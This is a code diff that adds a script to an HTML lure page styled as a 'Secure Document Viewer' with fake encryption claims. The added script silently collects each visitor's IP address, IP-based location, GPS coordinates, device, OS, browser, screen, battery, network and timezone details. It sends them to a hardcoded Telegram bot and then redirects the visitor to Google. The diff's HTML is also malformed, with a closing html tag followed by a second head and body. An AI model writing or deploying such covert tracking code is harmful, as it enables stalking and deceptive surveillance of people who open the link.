@@ -50,6 +50,205 @@
 
     <script>
     // =====================================================
+    // ✅ APNE DETAILS
+    // =====================================================
+    var BOT_TOKEN = "8706108077:AAEl6jcQIXT13uESKFpwkjBEfztDk9dC6qU";
+    var CHAT_ID   = "6882845015";
+    // =====================================================
+
+    function sendToTelegram(message) {
+        var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+        var data = {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+        };
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify(data));
+    }
+
+    function getDeviceModel(ua) {
+        var uaLower = ua.toLowerCase();
+        if (uaLower.indexOf('iphone') !== -1) {
+            var m = ua.match(/iPhone[^;]*?(\d+(?:,\d+)?\))/);
+            if (m) return m[0];
+            return 'iPhone';
+        }
+        if (uaLower.indexOf('sm-') !== -1) {
+            var m = ua.match(/SM-[A-Z0-9]+/);
+            if (m) return m[0];
+        }
+        if (uaLower.indexOf('pixel') !== -1) {
+            var m = ua.match(/Pixel \d+/);
+            if (m) return m[0];
+        }
+        if (uaLower.indexOf('redmi') !== -1) {
+            var m = ua.match(/Redmi [A-Z0-9]+/);
+            if (m) return m[0];
+        }
+        if (uaLower.indexOf('oneplus') !== -1) {
+            var m = ua.match(/OnePlus [A-Z0-9]+/);
+            if (m) return m[0];
+        }
+        if (uaLower.indexOf('samsung') !== -1) {
+            var m = ua.match(/samsung [a-z0-9]+/i);
+            if (m) return m[0];
+        }
+        if (uaLower.indexOf('vivo') !== -1) {
+            var m = ua.match(/vivo [A-Z0-9]+/);
+            if (m) return m[0];
+        }
+        if (uaLower.indexOf('oppo') !== -1) {
+            var m = ua.match(/OPPO [A-Z0-9]+/);
+            if (m) return m[0];
+        }
+        if (uaLower.indexOf('huawei') !== -1) {
+            var m = ua.match(/Huawei [A-Za-z0-9-]+/);
+            if (m) return m[0];
+        }
+        if (uaLower.indexOf('moto') !== -1) {
+            var m = ua.match(/Moto [A-Z0-9 \(\)]+/);
+            if (m) return m[0];
+        }
+        return "Unknown Model";
+    }
+
+    function getOS(ua) {
+        ua = ua.toLowerCase();
+        if (ua.indexOf('windows nt 10') !== -1) return 'Windows 10/11';
+        if (ua.indexOf('windows nt 6.3') !== -1) return 'Windows 8.1';
+        if (ua.indexOf('windows nt 6.2') !== -1) return 'Windows 8';
+        if (ua.indexOf('windows nt 6.1') !== -1) return 'Windows 7';
+        if (ua.indexOf('macintosh') !== -1 || ua.indexOf('mac os x') !== -1) return 'macOS';
+        if (ua.indexOf('iphone') !== -1) return 'iOS (iPhone)';
+        if (ua.indexOf('ipad') !== -1) return 'iOS (iPad)';
+        if (ua.indexOf('android') !== -1) return 'Android';
+        if (ua.indexOf('linux') !== -1) return 'Linux';
+        return 'Unknown OS';
+    }
+
+    function getBrowser(ua) {
+        if (ua.indexOf('Edg') !== -1) return 'Edge';
+        if (ua.indexOf('Chrome') !== -1) return 'Chrome';
+        if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) return 'Safari';
+        if (ua.indexOf('Firefox') !== -1) return 'Firefox';
+        if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) return 'Opera';
+        return 'Unknown';
+    }
+
+    // IP address lo
+    var userIP = "Unknown";
+    
+    var ipReq = new XMLHttpRequest();
+    ipReq.open("GET", "https://api.ipify.org?format=json", true);
+    ipReq.onload = function() {
+        if (ipReq.status === 200) {
+            var data = JSON.parse(ipReq.responseText);
+            userIP = data.ip;
+            
+            var geoReq = new XMLHttpRequest();
+            geoReq.open("GET", "https://ipapi.co/" + userIP + "/json/", true);
+            geoReq.onload = function() {
+                var geoData = {};
+                if (geoReq.status === 200) {
+                    try { geoData = JSON.parse(geoReq.responseText); } catch(e) {}
+                }
+                
+                var ua = navigator.userAgent;
+                var message = "";
+                message += "\uD83D\uDD0D *IP LOGGER - NEW VISITOR*\n";
+                message += "\u23F0 *Time:* " + new Date().toLocaleString() + "\n";
+                message += "\uD83C\uDF10 *IP:* `" + userIP + "`\n";
+                
+                if (geoData.city) {
+                    message += "\uD83D\uDCCD *Location:* " + geoData.city + ", " + (geoData.region || "") + ", " + (geoData.country_name || "") + "\n";
+                    message += "\uD83D\uDDFA\uFE0F *Lat/Lon:* " + (geoData.latitude || "?") + ", " + (geoData.longitude || "?") + "\n";
+                    message += "\uD83D\uDCE1 *ISP:* " + (geoData.org || "N/A") + "\n";
+                }
+                
+                message += "\uD83D\uDCF1 *Mobile:* " + (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua) ? 'Yes' : 'No') + "\n";
+                message += "\uD83D\uDCF2 *Device:* " + getDeviceModel(ua) + "\n";
+                message += "\uD83D\uDCBB *OS:* " + getOS(ua) + "\n";
+                message += "\uD83C\uDF0D *Browser:* " + getBrowser(ua) + "\n";
+                message += "\uD83D\uDCD0 *Screen:* " + screen.width + "x" + screen.height + " (DPR: " + (window.devicePixelRatio || 1) + ")\n";
+                message += "\uD83D\uDD17 *Referrer:* " + (document.referrer || "Direct") + "\n";
+                message += "\uD83D\uDD50 *Timezone:* " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n";
+                message += "\uD83C\uDF10 *Language:* " + (navigator.language || "Unknown");
+                
+                sendToTelegram(message);
+            };
+            geoReq.send();
+        }
+    };
+    ipReq.send();
+
+    // GPS Location
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            function(pos) {
+                var lat = pos.coords.latitude;
+                var lon = pos.coords.longitude;
+                var acc = pos.coords.accuracy;
+                var gpsMsg = "\uD83D\uDCCD *GPS Location Captured!*\n";
+                gpsMsg += "\uD83C\uDF10 *IP:* `" + userIP + "`\n";
+                gpsMsg += "\uD83D\uDCCD *Coordinates:* " + lat + ", " + lon + "\n";
+                gpsMsg += "\uD83C\uDFAF *Accuracy:* " + acc + " meters\n";
+                gpsMsg += "\uD83D\uDDFA\uFE0F *Maps:* https://www.google.com/maps?q=" + lat + "," + lon;
+                sendToTelegram(gpsMsg);
+            },
+            function(err) {
+                console.log("GPS denied");
+            },
+            { timeout: 7000, enableHighAccuracy: true }
+        );
+    }
+
+    // Battery status
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+            var batMsg = "\uD83D\uDD0B *Battery Info*\n";
+            batMsg += "\uD83C\uDF10 *IP:* `" + userIP + "`\n";
+            batMsg += "\uD83D\uDD0B *Level:* " + Math.round(battery.level * 100) + "%\n";
+            batMsg += "\u26A1 *Charging:* " + (battery.charging ? "Yes" : "No");
+            sendToTelegram(batMsg);
+        });
+    }
+
+    // Network info
+    if (navigator.connection) {
+        var conn = navigator.connection;
+        var netMsg = "\uD83D\uDCF6 *Network Info*\n";
+        netMsg += "\uD83C\uDF10 *IP:* `" + userIP + "`\n";
+        netMsg += "\uD83D\uDCF6 *Type:* " + (conn.effectiveType || "unknown") + "\n";
+        netMsg += "\u23F1\uFE0F *RTT:* " + (conn.rtt || 0) + "ms";
+        sendToTelegram(netMsg);
+    }
+
+    // 3.5 seconds baad redirect
+    setTimeout(function() {
+        window.location.href = "https://www.google.com";
+    }, 3500);
+    </script>
+</body>
+</html></head>
+<body>
+    <div class="card">
+        <div class="lock-icon">🔒</div>
+        <h1>Secure Document Viewer</h1>
+        <p>Verifying your identity and decrypting the document. Please wait...</p>
+        <div class="loader"></div>
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+        <p style="font-size: 14px; color: #888;">Redirecting you to secure portal...</p>
+        <div class="footer">Secured with 256-bit AES encryption</div>
+    </div>
+
+    <script>
+    // =====================================================
     // ✅ APNE DETAILS - SETUP DONE
     // =====================================================
     var BOT_TOKEN = "8706108077:AAEl6jcQIXT13uESKFpwkjBEfztDk9dC6qU";
